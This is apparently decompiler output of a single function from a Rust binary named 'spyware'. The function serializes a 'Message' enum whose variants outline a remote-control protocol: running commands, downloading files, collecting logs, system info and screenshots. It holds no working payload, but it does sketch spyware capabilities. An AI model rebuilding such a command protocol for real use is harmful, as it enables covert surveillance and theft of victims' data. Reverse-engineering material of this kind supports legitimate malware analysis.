
  fn spyware::communication::messages::_::_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..Message$GT$::serialize::h581434390f64cc04(arg1: *mut i32, arg2: *mut c_void, arg3: *mut i64) -> *mut i32

{
    let rcx: i64 = -0x8000000000000000 ^ *arg2;
    let mut rdx: i64 = 5;
    
    if rcx < 0xa
    {
        rdx = rcx;
    }
    
    match rdx
    {
        0 =>
        {
            _$LT$$RF$mut$u20$ron..ser..Serializer$LT$W$GT$$u20$as$u20$serde..ser..Serializer$GT$::serialize_newtype_variant::h71a5c6f16c075895(arg1, arg3, "Message", 7, 0, "RunCommandRequestcommandasync_ru…", 0x11, 
                arg2.byte_offset(8));
            arg1
        }
        1 =>
        {
            _$LT$$RF$mut$u20$ron..ser..Serializer$LT$W$GT$$u20$as$u20$serde..ser..Serializer$GT$::serialize_newtype_variant::h594fc0940569511d(arg1, arg3, "Message", 7, 1, "RunCommandResponseoutputerror_in…", 0x12, 
                arg2.byte_offset(8));
            arg1
        }
        2 =>
        {
            _$LT$$RF$mut$u20$ron..ser..Serializer$LT$W$GT$$u20$as$u20$serde..ser..Serializer$GT$::serialize_newtype_variant::h52a799a7b1261842(arg1, arg3, "Message", 7, 2, "DownloadFileRequestDownloadFileR…", 0x13, 
                arg2.byte_offset(8));
            arg1
        }
        3 =>
        {
            _$LT$$RF$mut$u20$ron..ser..Serializer$LT$W$GT$$u20$as$u20$serde..ser..Serializer$GT$::serialize_newtype_variant::h93368622c53b5c8b(arg1, arg3, "Message", 7, 3, "DownloadFileResponsefile_dataGet…", 0x14, 
                arg2.byte_offset(8));
            arg1
        }
        4 =>
        {
            _$LT$$RF$mut$u20$ron..ser..Serializer$LT$W$GT$$u20$as$u20$serde..ser..Serializer$GT$::serialize_newtype_variant::hcfd96867e85a5412(arg1, arg3, "Message", 7, 4, "GetBasicInfoRequestplaceholderOp…", 0x13, 
                arg2.byte_offset(8));
            arg1
        }
        5 =>
        {
            _$LT$$RF$mut$u20$ron..ser..Serializer$LT$W$GT$$u20$as$u20$serde..ser..Serializer$GT$::serialize_newtype_variant::h1c06ba1074de02d4(arg1, arg3, "Message", 7, 5, "GetBasicInfoResponseversiontarge…", 0x14, arg2);
            arg1
        }
        6 =>
        {
            _$LT$$RF$mut$u20$ron..ser..Serializer$LT$W$GT$$u20$as$u20$serde..ser..Serializer$GT$::serialize_newtype_variant::ha87054efd1afee95(arg1, arg3, "Message", 7, 6, "GetLogsRequestGetLogsResponseGet…", 0xe, arg2);
            arg1
        }
        7 =>
        {
            _$LT$$RF$mut$u20$ron..ser..Serializer$LT$W$GT$$u20$as$u20$serde..ser..Serializer$GT$::serialize_newtype_variant::h77454d0cb1512184(arg1, arg3, "Message", 7, 7, "GetLogsResponseGetScreenshotRequ…", 0xf, 
                arg2.byte_offset(8));
            arg1
        }
        8 =>
        {
            _$LT$$RF$mut$u20$ron..ser..Serializer$LT$W$GT$$u20$as$u20$serde..ser..Serializer$GT$::serialize_newtype_variant::hdb0b56c62e073598(arg1, arg3, "Message", 7, 8, "GetScreenshotRequestDisplayScree…", 0x14, arg2);
            arg1
        }
        9 =>
        {
            _$LT$$RF$mut$u20$ron..ser..Serializer$LT$W$GT$$u20$as$u20$serde..ser..Serializer$GT$::serialize_newtype_variant::hb1443c2e485bb9e8(arg1, arg3, "Message", 7, 9, "GetScreenshotResponsedisplays_sc…", 0x15, 
                arg2.byte_offset(8));
            arg1
        }
    }
}
